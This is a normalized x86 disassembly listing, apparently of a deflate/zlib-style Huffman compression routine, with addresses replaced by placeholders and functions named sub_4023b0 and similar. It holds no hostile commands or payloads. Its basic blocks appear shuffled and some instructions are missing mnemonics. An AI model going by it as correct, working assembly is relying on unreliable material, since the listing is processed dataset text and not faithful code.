add ebp 0x4
cmp eax r--data
mov [ esp + 0x14 ] ebp
jl r-xdata
mov [ esi + edi + 0x1c3d ] bl
mov ecx [ eax ]
mov ebp 0x1
inc edi
shl ebp cl
inc edx
cmp edx ebp
jl r-xdata
mov edx [ esp + 0x14 ]
mov ebp 0x1
mov [ edx ] edi
mov ecx [ eax ]
shl ebp cl
xor edx edx
test ebp ebp
jle r-xdata
cmp edi 0x100
push rw-data
sete al
push eax
push esi
call sub_4023b0
add esp 0xc
sar edi 0x7
cmp ebx 0x1e
jge r-xdata
cmp edi 0x100
push rw-data
sete dl
push edx
push esi
call sub_4023b0
add esp 0xc
lea edi [ esi + 0xfe4 ]
mov ecx 0x8
xor eax eax
[ edi ]
lea eax [ esi + 0x9fe ]
mov ecx 0x90
lea ecx [ esi + ebx * 4 + 0x1eb4 ]
lea edx [ ebx * 4 + r--data ]
mov [ esp + 0x14 ] ecx
mov [ eax ] 0x8
add eax 0x4
inc [ esi + 0xff4 ]
dec ecx
jne r-xdata
lea eax [ esi + 0xc3e ]
mov ecx 0x70
mov edx 0x100
mov ebp [ esp + 0x14 ]
add edx 0x4
inc ebx
add ebp 0x4
cmp edx r--data
mov [ esp + 0x14 ] ebp
jl r-xdata
mov [ esi + edi + 0x1d3d ] bl
mov ecx [ edx ]
sub ecx 0x7
mov ebp 0x1
shl ebp cl
inc edi
inc eax
cmp eax ebp
jl r-xdata
mov [ eax ] 0x9
add eax 0x4
inc [ esi + 0xff6 ]
dec ecx
jne r-xdata
cmp edx 0x117
jg r-xdata
mov ecx [ esp + 0x14 ]
mov eax edi
shl eax 0x7
mov [ ecx ] eax
mov ecx [ edx ]
sub ecx 0x7
mov ebp 0x1
shl ebp cl
xor eax eax
test ebp ebp
jle r-xdata
cmp edx 0x11f
jg r-xdata
mov eax 0x118
lea ecx [ esi + edx * 4 + 0x9fe ]
sub eax edx
add edx eax
lea eax [ esi + 0x9fc ]
push 0x11f
push eax
push esi
call sub_402a30
add esp 0xc
xor edi edi
lea ebx [ esi + 0xe7c ]
mov ebp 0x5
mov ecx 0x120
lea eax [ esi + edx * 4 + 0x9fe ]
sub ecx edx
mov [ ecx ] 0x7
add ecx 0x4
inc [ esi + 0xff2 ]
dec eax
jne r-xdata
push ebp
push edi
mov [ ebx + 0x2 ] bp
call sub_4038f0
add esp 0x8
mov [ ebx ] ax
inc edi
add ebx 0x4
cmp edi 0x1e
jl r-xdata
push esi
call sub_402660
add esp 0x4
pop ebp
pop ebx
mov [ eax ] 0x8
add eax 0x4
inc [ esi + 0xff4 ]
dec ecx
jne r-xdata
sub_402660
mov eax [ esp + 0x4 ]
push ebx
mov edx 0x11e
xor ebx ebx
lea ecx [ eax + 0x14 ]
mov [ ecx ] bx
add ecx 0x4
dec edx
jne r-xdata
lea ecx [ eax + 0x908 ]
mov edx 0x1e
mov [ ecx ] bx
add ecx 0x4
dec edx
jne r-xdata
lea ecx [ eax + 0xef4 ]
mov edx 0x13
mov [ ecx ] bx
add ecx 0x4
dec edx
jne r-xdata
mov ecx 0x1
mov [ eax + 0x1af40 ] ebx
mov [ eax + 0x1af3c ] ebx
mov [ eax + 0x1af34 ] ebx
mov [ eax + 0x1af30 ] ebx
mov [ eax + 0x1af2c ] ebx
mov [ eax + 0x1af38 ] bl
mov [ eax + 0x414 ] cx
mov [ eax + 0x1af39 ] cl
pop ebx
retn
sub_4026e0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov edx [ eax + 0x18f8 ]
push edi
mov ebp [ eax + esi * 4 + 0x1004 ]
lea ecx [ esi + esi ]
cmp ecx edx
mov [ esp + 0x14 ] ebp
jg r-xdata
mov [ eax + esi * 4 + 0x1004 ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x18 ]
mov esi [ eax + ecx * 4 + 0x1004 ]
mov dx [ edi + ebp * 4 ]
mov bx [ edi + esi * 4 ]
cmp dx bx
jb r-xdata
mov esi [ eax + ecx * 4 + 0x1008 ]
mov ebp [ eax + ecx * 4 + 0x1004 ]
mov dx [ edi + esi * 4 ]
mov bx [ edi + ebp * 4 ]
cmp dx bx
jb r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + ecx * 4 + 0x1004 ] ebp
pop ebp
pop ebx
retn
jne r-xdata
inc ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x1c ] ecx
shl ecx 0x1
mov [ eax + edx * 4 + 0x1004 ] esi
mov edx [ eax + 0x18f8 ]
cmp ecx edx
jle r-xdata
mov dl [ eax + ebp + 0x1900 ]
mov bl [ esi + eax + 0x1900 ]
cmp dl bl
jbe r-xdata
mov ebp [ esp + 0x14 ]
mov dl [ esi + eax + 0x1900 ]
mov bl [ eax + ebp + 0x1900 ]
cmp dl bl
ja r-xdata
jge r-xdata
mov edx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + edx * 4 + 0x1004 ] ebp
pop ebp
pop ebx
retn
sub_4027c0
sub esp 0x1c
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov ebx [ eax ]
mov esi [ esp + 0x2c ]
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0x18 ]
mov [ esp + 0x20 ] edx
mov edx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
push edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x14 ] eax
lea edi [ esi + 0xfe4 ]
mov ecx 0x8
xor eax eax
xor ebp ebp
[ edi ]
mov ecx [ esi + 0x18fc ]
mov [ esp + 0x34 ] ebp
mov [ esp + 0x10 ] ebx
mov [ esp + 0x1c ] edx
mov eax [ esi + ecx * 4 + 0x1004 ]
mov [ ebx + eax * 4 + 0x2 ] bp
mov ebp [ esi + 0x18fc ]
inc ebp
cmp ebp 0x23d
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov eax 0x23d
lea ecx [ esi + ebp * 4 + 0x1004 ]
sub eax ebp
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
add ebp eax
jmp r-xdata
mov eax [ esp + 0x30 ]
xor edi edi
mov ecx [ eax ]
xor eax eax
mov ax [ ebx + ecx * 4 + 0x2 ]
mov di [ ebx + eax * 4 + 0x2 ]
mov eax edi
inc eax
cmp eax edx
jle r-xdata
mov edx [ esp + 0x20 ]
mov [ ebx + ecx * 4 + 0x2 ] ax
cmp ecx edx
jg r-xdata
mov eax edx
mov edx [ esp + 0x34 ]
inc edx
mov [ esp + 0x34 ] edx
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
add ecx 0x4
dec eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
mov edx [ esp + 0x24 ]
inc [ esi + eax * 2 + 0xfe4 ]
xor edi edi
cmp ecx edx
jl r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x34 ]
test eax eax
je r-xdata
mov dx [ ebx + ecx * 4 ]
add eax edi
and edx 0xffff
imul eax edx
add [ esi + 0x1af3c ] eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edi ecx
sub edi edx
mov edx [ esp + 0x28 ]
mov edi [ edx + edi * 4 ]
push rw-data
call sub_4023d0
mov ebx [ esp + 0x20 ]
add esp 0x4
lea edx [ ebx - 0x1 ]
mov ebx [ esp + 0x14 ]
xor eax eax
mov ax [ ebx + ecx * 4 + 0x2 ]
mov ecx [ esi + 0x1af40 ]
add eax edi
mov ebx [ esp + 0x10 ]
imul eax edx
add ecx eax
mov [ esi + 0x1af40 ] ecx
dec [ esi + eax * 2 + 0xfe4 ]
add [ esi + eax * 2 + 0xfe6 ] 0x2
mov eax [ esp + 0x34 ]
dec [ esi + ebx * 2 + 0xfe4 ]
sub eax 0x2
test eax eax
mov [ esp + 0x34 ] eax
jg r-xdata
sub ecx 0x2
dec eax
cmp [ ecx ] 0x0
je r-xdata
mov eax edx
cmp [ esi + eax * 2 + 0xfe4 ] 0x0
lea ecx [ esi + eax * 2 + 0xfe4 ]
jne r-xdata
test ebx ebx
je r-xdata
lea ecx [ esi + ebx * 2 + 0xfe4 ]
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x34 ]
dec ebx
sub ecx 0x2
test ebx ebx
mov [ esp + 0x34 ] ecx
jne r-xdata
lea edx [ esi + ebp * 4 + 0x1004 ]
mov edx [ esp + 0x34 ]
xor ecx ecx
mov cx [ edx ]
test ecx ecx
mov [ esp + 0x30 ] ecx
je r-xdata
test ecx ecx
jne r-xdata
mov eax [ esp + 0x10 ]
lea ebp [ eax + edi * 4 + 0x2 ]
mov ax [ eax + edi * 4 + 0x2 ]
cmp ax bx
je r-xdata
mov edi [ edx - 0x4 ]
mov eax [ esp + 0x20 ]
sub edx 0x4
dec ebp
cmp edi eax
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] edx
jg r-xdata
mov ebp [ esp + 0x24 ]
dec ecx
mov [ esp + 0x30 ] ecx
and eax 0xffff
push ebx
push eax
push edi
push rw-data
call sub_4023d0
xor ecx ecx
mov edx ebx
mov cx [ ebp ]
xor eax eax
sub edx ecx
mov ecx [ esp + 0x20 ]
add esp 0x10
mov ax [ ecx + edi * 4 ]
mov ecx [ esp + 0x30 ]
imul edx eax
mov eax [ esi + 0x1af3c ]
add eax edx
mov edx [ esp + 0x28 ]
mov [ esi + 0x1af3c ] eax
mov [ ebp ] bx
sub_402a30
sub esp 0x20
xor eax eax
lea edx [ esp + 0x2 ]
push ebx
push esi
push edi
mov edi [ esp + 0x30 ]
mov esi 0xf
lea ecx [ edi + 0xfe4 ]
mov bx [ ecx ]
add ecx 0x2
add bx ax
add edx 0x2
shl ebx 0x1
mov eax ebx
dec esi
mov [ edx - 0x2 ] ax
jne r-xdata
xor ecx ecx
and eax 0xffff
mov cx [ edi + 0x1002 ]
push rw-data
lea edx [ ecx + eax - 0x1 ]
cmp edx 0x7fff
sete al
push eax
push edi
call sub_4023b0
mov edi [ esp + 0x44 ]
add esp 0xc
push edi
push rw-data
call sub_4023d0
add esp 0x8
test edi edi
jl r-xdata
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov esi [ esp + 0x34 ]
inc edi
add esi 0x4
dec edi
jne r-xdata
mov dx [ esp + ecx * 2 + 0xc ]
push ecx
mov eax edx
and eax 0xffff
inc edx
push eax
mov [ esp + ecx * 2 + 0x14 ] dx
call sub_4038f0
add esp 0x8
mov [ esi ] ax
xor ecx ecx
mov cx [ esi + 0x2 ]
test ecx ecx
je r-xdata
sub_402ae0
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov ebx [ eax + 0x4 ]
mov ebp [ eax + 0x10 ]
mov esi [ esp + 0x18 ]
push edi
mov edi [ eax ]
xor eax eax
cmp ebp eax
mov [ esp + 0x10 ] 0xffffffff
mov [ esp + 0x14 ] ebp
mov [ esi + 0x18f8 ] eax
mov [ esi + 0x18fc ] 0x23d
jle r-xdata
mov ecx [ esi + 0x18f8 ]
cmp ecx 0x2
jge r-xdata
mov edx edi
mov edx [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp edx 0x2
jge r-xdata
mov [ edx + 0x2 ] 0x0
mov ecx [ esi + 0x18f8 ]
mov [ esp + 0x10 ] eax
inc ecx
mov [ esi + 0x18f8 ] ecx
mov [ esi + ecx * 4 + 0x1004 ] eax
mov [ eax + esi + 0x1900 ] 0x0
jmp r-xdata
lea ecx [ edi + ebp * 4 ]
mov [ esp + 0x1c ] ecx
push ebx
push edi
push esi
call sub_4026e0
add esp 0xc
dec ebx
cmp ebx 0x1
jge r-xdata
xor eax eax
inc edx
mov [ esp + 0x10 ] edx
mov eax edx
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
inc eax
add edx 0x4
cmp eax ebp
jl r-xdata
mov eax [ esp + 0x14 ]
inc cl
push 0x1
push edi
mov [ esi + eax + 0x1900 ] cl
mov [ edi + ebp * 4 + 0x2 ] ax
mov [ edi + ebx * 4 + 0x2 ] ax
mov [ esi + 0x1008 ] eax
inc eax
push esi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x28 ]
add eax 0x4
mov [ esp + 0x28 ] eax
call sub_4026e0
mov eax [ esi + 0x18f8 ]
add esp 0xc
cmp eax 0x2
jge r-xdata
mov cl al
mov ecx [ esi + 0x18f8 ]
cmp ecx 0x2
jl r-xdata
xor ecx ecx
mov cx [ ebx + eax * 4 + 0x2 ]
mov eax [ esi + 0x1af40 ]
sub eax ecx
mov [ esi + 0x1af40 ] eax
inc ecx
mov [ esi + 0x18f8 ] ecx
mov [ esi + ecx * 4 + 0x1004 ] eax
mov [ edi + eax * 4 ] 0x1
mov [ esi + eax + 0x1900 ] 0x0
mov ecx [ esi + 0x1af3c ]
dec ecx
test ebx ebx
mov [ esi + 0x1af3c ] ecx
je r-xdata
mov eax [ esi + 0x18f8 ]
mov ebx [ esi + 0x1008 ]
push 0x1
push edi
mov edx [ esi + eax * 4 + 0x1004 ]
dec eax
push esi
mov [ esi + 0x1008 ] edx
mov [ esi + 0x18f8 ] eax
call sub_4026e0
mov eax [ esi + 0x18fc ]
mov ebp [ esi + 0x1008 ]
add esp 0xc
dec eax
mov [ esi + 0x18fc ] eax
mov ecx [ esp + 0x1c ]
mov [ esi + eax * 4 + 0x1004 ] ebx
mov edx [ esi + 0x18fc ]
dec edx
mov eax edx
mov [ esi + 0x18fc ] edx
mov [ esi + eax * 4 + 0x1004 ] ebp
mov ax [ edi + ebx * 4 ]
add ax [ edi + ebp * 4 ]
mov [ ecx ] ax
mov al [ esi + ebx + 0x1900 ]
mov cl [ esi + ebp + 0x1900 ]
cmp al cl
jb r-xdata
mov edx [ esi + 0x18fc ]
dec edx
mov [ esi + 0x18fc ] edx
mov eax edx
mov edx [ esi + 0x1008 ]
mov [ esi + eax * 4 + 0x1004 ] edx
mov eax [ esp + 0x20 ]
push eax
push esi
call sub_4027c0
mov ecx [ esp + 0x18 ]
push ecx
push edi
push esi
call sub_402a30
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ esi + 0x18f8 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
cmp ebx 0x1
jl r-xdata
sub_402d00
push ecx
mov eax [ esp + 0xc ]
push ebx
xor ecx ecx
push esi
mov cx [ eax + 0x2 ]
push edi
xor edi edi
mov [ esp + 0xc ] 0xffffffff
test ecx ecx
mov edx 0x7
mov esi 0x4
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
mov [ eax + ebx * 4 + 0x6 ] 0xffff
jl r-xdata
mov edx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
pop ecx
retn
inc ebx
push ebp
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
lea ebp [ eax + 0x6 ]
cmp edi esi
jge r-xdata
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
add [ ebx + eax * 4 + 0xef4 ] di
jmp r-xdata
mov eax [ esp + 0x1c ]
add ebp 0x4
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
cmp edi 0xa
jg r-xdata
cmp eax [ esp + 0x10 ]
je r-xdata
xor edi edi
mov [ esp + 0x10 ] eax
test ecx ecx
jne r-xdata
mov eax ecx
xor ecx ecx
mov cx [ ebp ]
inc edi
cmp edi edx
jge r-xdata
pop ebp
inc [ ebx + 0xf3c ]
inc [ ebx + 0xf38 ]
jmp r-xdata
inc [ ebx + 0xf34 ]
jmp r-xdata
inc [ ebx + eax * 4 + 0xef4 ]
cmp eax ecx
jne r-xdata
mov edx 0x8a
mov esi 0x3
jmp r-xdata
mov edx 0x7
mov esi 0x4
mov edx 0x6
mov esi 0x3
jmp r-xdata
sub_402df0
push ecx
mov edx [ esp + 0xc ]
push ebp
xor ebp ebp
push esi
mov bp [ edx + 0x2 ]
push edi
xor edi edi
mov [ esp + 0xc ] 0xffffffff
test ebp ebp
mov eax 0x7
mov ecx 0x4
jne r-xdata
mov esi [ esp + 0x1c ]
test esi esi
jl r-xdata
mov eax 0x8a
mov ecx 0x3
pop edi
pop esi
pop ebp
pop ecx
retn
add edx 0x6
inc esi
mov [ esp + 0x1c ] esi
mov esi [ esp + 0x14 ]
push ebx
mov [ esp + 0x1c ] edx
cmp edi ecx
jge r-xdata
cmp ebx ebp
je r-xdata
test ebx ebx
je r-xdata
xor eax eax
xor ecx ecx
mov ax [ esi + ebx * 4 + 0xef6 ]
mov cx [ esi + ebx * 4 + 0xef4 ]
push eax
push ecx
push esi
call sub_403810
add esp 0xc
dec edi
jne r-xdata
mov edx [ esp + 0x1c ]
mov ebx [ esp + 0x20 ]
add edx 0x4
dec ebx
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] ebx
jne r-xdata
cmp edi 0xa
jg r-xdata
cmp ebx [ esp + 0x10 ]
je r-xdata
jmp r-xdata
mov ebx ebp
xor ebp ebp
mov bp [ edx ]
inc edi
cmp edi eax
jge r-xdata
pop ebx
xor edx edx
xor eax eax
mov dx [ esi + 0xf3e ]
mov ax [ esi + 0xf3c ]
push edx
push eax
push esi
call sub_403810
push 0x7
add edi 0xfffffff5
xor eax eax
xor ecx ecx
mov ax [ esi + 0xf3a ]
mov cx [ esi + 0xf38 ]
push eax
push ecx
push esi
call sub_403810
push 0x3
add edi 0xfffffffd
jmp r-xdata
cmp edi 0x3
jl r-xdata
xor edx edx
xor eax eax
mov dx [ esi + ebx * 4 + 0xef6 ]
mov ax [ esi + ebx * 4 + 0xef4 ]
push edx
push eax
push esi
call sub_403810
add esp 0xc
dec edi
xor edi edi
mov [ esp + 0x10 ] ebx
test ebp ebp
jne r-xdata
cmp ebx ebp
jne r-xdata
mov eax 0x8a
mov ecx 0x3
jmp r-xdata
push edi
push esi
call sub_403810
add esp 0x18
xor eax eax
cmp edi 0x6
jg r-xdata
mov eax 0x7
mov ecx 0x4
mov eax 0x6
mov ecx 0x3
jmp r-xdata
mov eax 0x1
jmp r-xdata
push rw-data
push eax
push esi
call sub_4023b0
xor ecx ecx
xor edx edx
mov cx [ esi + 0xf36 ]
mov dx [ esi + 0xf34 ]
push ecx
push edx
push esi
call sub_403810
add edi 0xfffffffd
push 0x2
push edi
push esi
call sub_403810
add esp 0x24
jmp r-xdata
sub_402f90
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xfa8 ]
lea ecx [ esi + 0x14 ]
push eax
push ecx
push esi
call sub_402d00
mov edx [ esi + 0xfc4 ]
lea eax [ esi + 0x908 ]
push edx
push eax
push esi
call sub_402d00
lea ecx [ esi + 0xfc8 ]
push ecx
push esi
call sub_402ae0
add esp 0x20
mov edi 0x12
mov ecx [ esi + 0x1af3c ]
lea eax [ edi + edi * 2 + 0x11 ]
add ecx eax
mov [ esi + 0x1af3c ] ecx
mov eax ecx
mov ecx [ esi + 0x1af40 ]
push ecx
push eax
push rw-data
call sub_4023d0
add esp 0xc
mov eax edi
pop edi
pop esi
retn
dec edi
cmp edi 0x3
jge r-xdata
xor edx edx
mov dl [ edi + r--data ]
cmp [ esi + edx * 4 + 0xef6 ] 0x0
jne r-xdata
sub_403020
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov edi [ esp + 0x18 ]
cmp edi 0x101
jl r-xdata
xor eax eax
cmp ebp 0x1
jl r-xdata
xor eax eax
cmp ebp 0x1e
jg r-xdata
cmp ebx 0x4
jl r-xdata
mov ecx [ esi + 0x1af6c ]
push ecx
push rw-data
call sub_4023d0
mov edx [ esp + 0x20 ]
lea eax [ esi + 0x14 ]
dec edx
push edx
push eax
push esi
call sub_402df0
mov ecx [ esi + 0x1af6c ]
add esp 0x14
push ecx
push rw-data
call sub_4023d0
lea edx [ esi + 0x908 ]
push ebp
push edx
push esi
call sub_402df0
mov eax [ esi + 0x1af6c ]
add esp 0x14
push eax
push rw-data
call sub_4023d0
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn
xor ecx ecx
mov cl [ edi + r--data ]
push ecx
push rw-data
call sub_4023d0
xor edx edx
xor eax eax
mov dl [ edi + r--data ]
push 0x3
mov ax [ esi + edx * 4 + 0xef6 ]
push eax
push esi
call sub_403810
add esp 0x14
inc edi
cmp edi ebx
jl r-xdata
cmp ebx 0x13
jg r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov esi [ esp + 0x14 ]
push rw-data
push eax
push esi
call sub_4023b0
add esp 0xc
cmp edi 0x11e
jg r-xdata
push rw-data
push eax
push esi
call sub_4023b0
add esp 0xc
push rw-data
call sub_4023d0
add edi 0xfffffeff
push 0x5
push edi
push esi
call sub_403810
dec ebp
push 0x5
push ebp
push esi
call sub_403810
lea eax [ ebx - 0x4 ]
push 0x4
push eax
push esi
call sub_403810
add esp 0x28
xor edi edi
test ebx ebx
jle r-xdata
sub_403160
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x1af34 ]
mov cl [ esi + 0x1af38 ]
mov [ eax + esi + 0x19f2c ] cl
mov edx [ esi + 0x1af50 ]
cmp [ edx ] 0xffff
jne r-xdata
push ebx
push ebp
lea eax [ esi + 0xf90 ]
push edi
push eax
push esi
call sub_402ae0
mov ecx [ esi + 0x1af40 ]
mov edx [ esi + 0x1af3c ]
add esp 0x8
push ecx
push edx
push rw-data
call sub_4023d0
lea eax [ esi + 0xfac ]
push eax
push esi
call sub_402ae0
mov ecx [ esi + 0x1af40 ]
mov edx [ esi + 0x1af3c ]
add esp 0x14
push ecx
push edx
push rw-data
call sub_4023d0
push esi
call sub_402f90
mov ebp [ esp + 0x2c ]
mov edx [ esi + 0x1af4c ]
mov ecx [ esi + 0x1af40 ]
add edx ebp
add esp 0x10
mov [ esi + 0x1af4c ] edx
mov edx [ esi + 0x1af30 ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x1af3c ]
push edx
mov edx [ esi + 0x1af2c ]
lea ebx [ ecx + 0xa ]
push edx
lea edi [ eax + 0xa ]
shr ebx 0x3
push ebp
push ecx
shr edi 0x3
push ebx
push eax
push edi
push rw-data
call sub_4023d0
add esp 0x20
cmp ebx edi
ja r-xdata
push esi
call sub_403750
add esp 0x4
lea eax [ ebp + 0x4 ]
cmp eax edi
ja r-xdata
mov edi ebx
cmp ebx edi
mov edi [ esp + 0x20 ]
push 0x3
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ edi + 0x4 ]
push edx
push esi
call sub_403810
mov eax [ esp + 0x20 ]
mov ecx [ esi + 0xfc4 ]
mov edx [ esi + 0xfa8 ]
inc eax
inc ecx
push eax
inc edx
push ecx
push edx
push esi
call sub_403020
lea eax [ esi + 0x908 ]
lea ecx [ esi + 0x14 ]
push eax
push ecx
push esi
call sub_4035c0
mov edx [ esi + 0x1af3c ]
mov eax [ esi + 0x1af48 ]
add esp 0x28
lea eax [ edx + eax + 0x3 ]
lea ecx [ edi + 0x2 ]
push ecx
push esi
call sub_403810
lea edx [ esi + 0xe7c ]
lea eax [ esi + 0x9fc ]
push edx
push eax
push esi
call sub_4035c0
mov ecx [ esi + 0x1af48 ]
mov edx [ esi + 0x1af40 ]
add esp 0x18
lea eax [ ecx + edx + 0x3 ]
jmp r-xdata
mov edi [ esp + 0x20 ]
push 0x3
push edi
push esi
call sub_403810
mov ecx [ esi + 0x1af48 ]
mov eax [ esp + 0x24 ]
add ecx 0xa
push 0x1
shr ecx 0x3
push ebp
push eax
lea edx [ ecx + ebp + 0x4 ]
mov ecx [ esi + 0x1af44 ]
add ecx edx
push esi
mov [ esi + 0x1af44 ] ecx
mov [ esi + 0x1af48 ] 0x0
call sub_403a00
add esp 0x1c
jmp r-xdata
push rw-data
call sub_4023d0
mov eax [ esi + 0x1af48 ]
mov ecx [ esi + 0x1af44 ]
add esp 0x4
shr eax 0x3
add eax ecx
pop esi
retn
push esi
call sub_403910
mov eax [ esi + 0x1af48 ]
add esp 0x4
add eax 0x7
mov [ esi + 0x1af48 ] eax
mov edx [ esi + 0x1af44 ]
mov ecx eax
shr ecx 0x3
add edx ecx
and eax 0x7
mov [ esi + 0x1af44 ] edx
mov [ esi + 0x1af48 ] eax
mov edx [ esi + 0x1af44 ]
mov eax [ esi + 0x1af48 ]
push rw-data
lea ecx [ eax + edx * 8 ]
mov edx [ esi + 0x1af6c ]
cmp ecx edx
sete dl
push edx
push esi
call sub_4023b0
push esi
call sub_402660
add esp 0x10
test edi edi
pop edi
pop ebp
pop ebx
je r-xdata
sub_4033b0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov eax [ esi + 0x1af2c ]
mov [ esi + eax + 0x1f2c ] bl
mov ecx [ esi + 0x1af2c ]
inc ecx
test edi edi
mov [ esi + 0x1af2c ] ecx
jne r-xdata
dec edi
cmp di 0x7efa
jae r-xdata
inc [ esi + ebx * 4 + 0x14 ]
jmp r-xdata
xor eax eax
cmp bx 0xff
ja r-xdata
mov cl [ esi + 0x1af39 ]
mov al [ esi + 0x1af2c ]
shl cl 0x1
test al 0x7
mov [ esi + 0x1af39 ] cl
jne r-xdata
mov eax edi
sar eax 0x7
mov al [ eax + esi + 0x1d3d ]
mov al [ esi + edi + 0x1c3d ]
jmp r-xdata
cmp edi 0x100
jge r-xdata
cmp [ esi + 0x4 ] 0x2
jle r-xdata
mov eax [ esi + 0x1af34 ]
mov cl [ esi + 0x1af38 ]
mov [ esi + eax + 0x19f2c ] cl
mov eax [ esi + 0x1af34 ]
inc eax
mov [ esi + 0x1af38 ] 0x0
mov [ esi + 0x1af34 ] eax
mov [ esi + 0x1af39 ] 0x1
and eax 0xff
inc [ esi + eax * 4 + 0x908 ]
mov ecx [ esi + 0x1af30 ]
lea eax [ esi + eax * 4 + 0x908 ]
mov [ esi + ecx * 2 + 0x9f2c ] di
mov ecx [ esi + 0x1af30 ]
mov dl [ esi + 0x1af39 ]
mov al [ esi + 0x1af38 ]
inc ecx
or al dl
mov [ esi + 0x1af30 ] ecx
mov [ esi + 0x1af38 ] al
mov ecx edi
sar ecx 0x7
mov al [ ecx + esi + 0x1d3d ]
mov al [ esi + edi + 0x1c3d ]
jmp r-xdata
cmp [ esi + 0x1af2c ] 0x7fff
je r-xdata
mov eax [ esi + 0x1af2c ]
test eax 0xfff
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp al 0x1e
jae r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
cmp [ esi + 0x1af30 ] 0x8000
je r-xdata
mov ebx [ esi + 0x6af84 ]
lea edi [ eax * 8 ]
mov eax [ esi + 0x6af74 ]
push ebp
sub ebx eax
mov eax r--data
lea ecx [ esi + 0x908 ]
push rw-data
push eax
push esi
call sub_4023b0
xor edx edx
add esp 0xc
mov dl [ esi + ebx + 0x1b3d ]
inc [ esi + edx * 4 + 0x418 ]
cmp edi 0x100
lea eax [ esi + edx * 4 + 0x418 ]
jge r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov edx [ eax ]
xor ebp ebp
mov bp [ ecx ]
add edx 0x5
imul edx ebp
add eax 0x4
add edi edx
add ecx 0x4
cmp eax r--data
jl r-xdata
shr edi 0x3
xor edx edx
mov ecx 0x64
lea eax [ edi + edi * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
div ebx
mov edx [ esi + 0x1af30 ]
sub ecx eax
mov eax [ esi + 0x1af2c ]
push ecx
push edi
push ebx
push edx
push eax
push rw-data
call sub_4023d0
mov eax [ esi + 0x1af2c ]
mov ecx [ esi + 0x1af30 ]
add esp 0x18
shr eax 0x1
cmp ecx eax
pop ebp
jae r-xdata
shr ebx 0x1
cmp edi ebx
jb r-xdata
sub_4035c0
sub esp 0x8
push esi
mov esi [ esp + 0x10 ]
xor eax eax
mov ecx [ esi + 0x1af2c ]
mov [ esp + 0x8 ] eax
cmp ecx eax
mov [ esp + 0x7 ] al
je r-xdata
mov eax [ esp + 0x14 ]
xor edx edx
xor ecx ecx
mov dx [ eax + 0x402 ]
mov cx [ eax + 0x400 ]
push edx
push ecx
push esi
call sub_403810
add esp 0xc
pop esi
add esp 0x8
retn
push ebx
mov ebx [ esp + 0x1c ]
lea ecx [ esi + 0x9f2c ]
push ebp
push edi
mov [ esp + 0x1c ] ecx
jmp r-xdata
test al 0x7
jne r-xdata
xor ecx ecx
mov cl [ esi + eax + 0x1f2c ]
inc eax
mov [ esp + 0x24 ] eax
mov al [ esp + 0x13 ]
test al 0x1
mov edi ecx
jne r-xdata
mov edi [ esp + 0x14 ]
mov dl [ edi + esi + 0x19f2c ]
inc edi
mov [ esp + 0x13 ] dl
mov [ esp + 0x14 ] edi
mov eax [ esp + 0x20 ]
xor edx edx
mov dl [ edi + esi + 0x1b3d ]
xor ecx ecx
mov ebp edx
xor edx edx
mov cx [ eax + ebp * 4 + 0x406 ]
mov dx [ eax + ebp * 4 + 0x404 ]
push ecx
push edx
push esi
call sub_403810
mov eax [ ebp * 4 + r--data ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
xor edx edx
xor ecx ecx
mov dx [ eax + edi * 4 + 0x2 ]
mov cx [ eax + edi * 4 ]
push edx
push ecx
jmp r-xdata
mov eax [ esp + 0x1c ]
xor ebp ebp
mov bp [ eax ]
add eax 0x2
cmp ebp 0x100
mov [ esp + 0x1c ] eax
jae r-xdata
push eax
mov eax [ esi + ebp * 4 + 0x1e40 ]
sub edi eax
push edi
push esi
call sub_403810
add esp 0xc
push esi
